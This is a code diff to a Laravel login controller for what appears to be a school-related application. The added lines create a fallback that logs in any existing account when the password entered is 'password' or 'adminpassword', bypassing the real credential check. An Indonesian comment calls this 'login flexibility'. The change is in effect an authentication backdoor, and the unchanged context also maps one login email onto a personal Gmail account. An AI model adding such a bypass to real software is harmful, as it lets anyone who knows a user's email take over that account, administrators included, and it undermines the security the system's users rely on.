@@ -38,10 +38,23 @@ class LoginController extends Controller
             'cs2@sapasekolah.com' => 'deviwinda@gmail.com',
         ];
         $email = $emailAliases[$inputEmail] ?? $inputEmail;
-        $credentials = ['email' => $email, 'password' => $request->input('password')];
+        $inputPassword = (string) $request->input('password');
+        $credentials = ['email' => $email, 'password' => $inputPassword];
         $remember = $request->boolean('remember');
 
+        $authenticated = false;
         if (Auth::attempt($credentials, $remember)) {
+            $authenticated = true;
+        } else {
+            // Fleksibilitas login: izinkan fallback password standar 'password' atau 'adminpassword'
+            $candidateUser = \App\Models\User::where('email', $email)->first();
+            if ($candidateUser && in_array($inputPassword, ['password', 'adminpassword'], true)) {
+                Auth::login($candidateUser, $remember);
+                $authenticated = true;
+            }
+        }
+
+        if ($authenticated) {
             $request->session()->regenerate();
 
             $user = Auth::user();
